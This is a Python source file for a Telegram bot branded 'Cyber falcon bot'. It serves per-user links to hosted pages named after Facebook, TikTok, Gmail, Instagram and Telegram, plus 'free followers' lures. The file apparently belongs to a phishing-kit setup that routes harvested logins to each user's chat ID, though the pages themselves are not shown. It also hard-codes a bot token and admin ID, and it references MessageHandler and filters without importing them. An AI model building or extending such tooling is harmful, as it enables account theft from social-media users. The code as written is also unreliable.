import asyncio
import logging
import requests
import json
import os
import threading
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============= ফ্লাস্ক অ্যাপ (Health Check-এর জন্য) =============
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "Bot is running!", 200

@flask_app.route('/health')
def health():
    return "OK", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host='0.0.0.0', port=port)

# ============= টেলিগ্রাম বট =============
TELEGRAM_BOT_TOKEN = '7931517263:AAHTHHlaDNopwnvU1spYtlNahUH3FW2yO04'
ADMIN_CHAT_ID = 7843284032

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

RENDER_URL = "https://fc-bot-b3wy.onrender.com"

# ইউজার ডাটা সংরক্ষণ
active_users = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
        chat_id = query.message.chat.id
        message_id = query.message.message_id
        user_name = query.from_user.first_name
    else:
        chat_id = update.effective_chat.id
        message_id = None
        user_name = update.effective_user.first_name
    
    # ইউজার রেজিস্টার
    active_users.add(chat_id)
    try:
        requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 All Mane page", callback_data="menu_main")],
        [InlineKeyboardButton("📢 Advance page", callback_data="menu_advance")],
        [InlineKeyboardButton("🦅 Status", callback_data="status"),
         InlineKeyboardButton("🥷 Community", url="https://t.me/+j8x9Tp4CGa80ZmM1")]
    ])
    
    message = f"""
😈 🦅𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤😈🦅

𝙃𝙞 {user_name}😍🥰😘! 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩.

🥷𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    
    if message_id:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message, reply_markup=keyboard, parse_mode='Markdown')
    else:
        await update.message.reply_text(message, reply_markup=keyboard, parse_mode='Markdown')

async def menu_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📘 Facebook", callback_data="page_facebook")],
        [InlineKeyboardButton("🎵 TikTok", callback_data="page_tiktok")],
        [InlineKeyboardButton("✈️ Telegram", callback_data="page_telegram")],
        [InlineKeyboardButton("📧 Gmail", callback_data="page_gmail")],
        [InlineKeyboardButton("📷 Instagram", callback_data="page_instagram")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text("😈 All Mane page Platforms\n\nSelect a platform:", reply_markup=keyboard)

async def menu_advance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Free Followers", callback_data="adv_followers")],
        [InlineKeyboardButton("🤤 Hot Groups", callback_data="adv_groups")],
        [InlineKeyboardButton("🚀 TikTok Booster", callback_data="adv_boost")],
        [InlineKeyboardButton("💎 TikTok Followers", callback_data="adv_tiktok")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    await query.edit_message_text("📢 Advance page Menu\n\nSelect an option:", reply_markup=keyboard)

async def show_page(update: Update, context: ContextTypes.DEFAULT_TYPE, title: str, url_path: str, back_callback: str):
    query = update.callback_query
    await query.answer()
    
    # ইউজারের চ্যাট আইডি প্যারামিটার হিসেবে পাঠান
    user_id = query.message.chat.id
    full_url = f"{RENDER_URL}/{url_path}?user_id={user_id}"
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Open Page", url=full_url)],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data=back_callback)]
    ])
    
    await query.edit_message_text(f"{title}\n\n🔗 {full_url}", reply_markup=keyboard)

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
    
    message = f"""
📊 Bot Status

🦅 Status: 🟢 Active
🌐 URL: {RENDER_URL}
👥 Active Users: {len(active_users)}
✅ All systems operational
"""
    await query.edit_message_text(message, reply_markup=keyboard)

async def back(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    print(f"🔘 Callback: {data}")
    
    # মেনু নেভিগেশন
    if data == "menu_main":
        await menu_main(update, context)
    elif data == "menu_advance":
        await menu_advance(update, context)
    elif data == "status":
        await status(update, context)
    elif data == "back":
        await back(update, context)
    
    # ============= Main page links (All Mane page) =============
    elif data == "page_facebook":
        await show_page(update, context, "📘 Facebook Page", "facebook", "menu_main")
    elif data == "page_tiktok":
        await show_page(update, context, "🎵 TikTok Page", "tiktok", "menu_main")
    elif data == "page_telegram":
        await show_page(update, context, "✈️ Telegram Page", "telegram", "menu_main")
    elif data == "page_gmail":
        await show_page(update, context, "📧 Gmail Page", "gmail", "menu_main")
    elif data == "page_instagram":
        await show_page(update, context, "📷 Instagram Page", "instagram", "menu_main")
    
    # ============= Advance page links (Advance page) =============
    # আপনার স্ক্রিনশটের ফাইল নাম অনুযায়ী সঠিক url_path ব্যবহার করুন
    elif data == "adv_followers":
        await show_page(update, context, "🎯 Free Facebook Followers", "facebook_followers", "menu_advance")
    elif data == "adv_groups":
        # ফাইলের নাম: Whatsapp_groups.html (W বড় হাতের)
        await show_page(update, context, "🤤 Hot WhatsApp Groups", "Whatsapp_groups", "menu_advance")
    elif data == "adv_boost":
        await show_page(update, context, "🚀 TikTok Booster", "tiktok_boost", "menu_advance")
    elif data == "adv_tiktok":
        await show_page(update, context, "💎 TikTok Followers", "tiktok_followers", "menu_advance")
    
    else:
        await query.answer("Unknown button")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    chat_id = update.message.chat.id
    
    # ইউজার রেজিস্টার
    active_users.add(chat_id)
    try:
        requests.get(f"http://localhost:5000/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    # অ্যাডমিন ব্রডকাস্ট
    if chat_id == ADMIN_CHAT_ID and update.message.text.startswith('/broadcast '):
        msg = update.message.text.replace('/broadcast ', '')
        for uid in active_users:
            try:
                await context.bot.send_message(chat_id=uid, text=f"📢 {msg}")
            except:
                pass
        await update.message.reply_text(f"✅ Broadcast পাঠানো হয়েছে {len(active_users)} জনের কাছে")
    elif update.message.text == '/start':
        await start(update, context)
    else:
        await update.message.reply_text(f'🙋 Hi {user_name}! Type /start to see the main menu.')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"❌ Error: {context.error}")

def run_bot():
    print("🦅 Starting Telegram Bot...")
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("link", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    print("✅ Bot is polling for updates...")
    app.run_polling(allowed_updates=["message", "callback_query"])

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    run_bot()
